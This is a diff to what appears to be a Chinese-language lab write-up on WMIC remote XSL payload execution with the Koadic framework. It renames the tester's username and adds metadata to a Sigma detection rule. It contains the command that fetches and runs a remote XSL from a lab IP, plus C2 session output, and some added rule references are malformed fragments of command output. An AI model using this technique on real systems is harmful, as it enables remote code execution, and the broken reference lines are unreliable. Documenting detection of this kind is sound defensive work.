@@ -84,14 +84,14 @@ wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
 靶机测试结果
 
 ```dos
-C:\Users\12306Br0>wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
+C:\Users\0x783kb>wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
   os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"12306BR0-PCroot\cimv2roo
 t\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\Device\Hardd
 iskVolume17601Multiprocessor FreeMicrosoft Windows 7 旗舰版 93686Win32_Operating
 SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256
 29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171
 72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 旗
-舰版 |C:\Windows|\Device\Harddisk0\Partition2422164-bit205225618TRUE112306Br0004
+舰版 |C:\Windows|\Device\Harddisk0\Partition2422164-bit205225618TRUE10x783kb004
 26-292-0000007-85792102343416OK272\Device\HarddiskVolume2C:\Windows\system32C:44
 4004820966326.1.7601C:\Windows
 ```
@@ -102,7 +102,7 @@ SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256
 
 ```bash
 [+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0
-[+] Zombie 0: 12306Br0-PC\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate
+[+] Zombie 0: 0x783kb-PC\0x783kb @ 12306BR0-PC -- Windows 7 Ultimate
 [!] Zombie 0: Timed out.
 [+] Zombie 0: Re-connected.
 (koadic: sta/js/wmic)# zombies 0
@@ -114,7 +114,7 @@ SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256
         Listener:               0
 
         IP:                     192.168.126.149
-        User:                   12306Br0-PC\12306Br0
+        User:                   0x783kb-PC\0x783kb
         Hostname:               12306BR0-PC
         Primary DC:             Unknown
         OS:                     Windows 7 Ultimate
@@ -164,7 +164,16 @@ EventID：4688
    id: 4e7b8c9d-3f2a-4b1c-a9e4-1f2d3c4e5f6b
    status: experimental
    description: 检测WMIC执行可疑命令或加载远程XSL文件，可能表明恶意Payload执行
+   author: 0x783kb
    date: 2025/06/06
+   tags:
+     - attack.execution
+     - attack.t1047
+   references:
+     - https://github.com/zerosum0x0/koadic.git
+     - http://192.168.126.146:9996/6G69i.xsl
+     - http://192.168.126.146:9996/6G69i.xsl"
+     - http://192.168.126.146:9996/6G69i.xsl"12306BR0-PCroot\cimv2roo
    logsource:
      category: process_creation
      product: windows
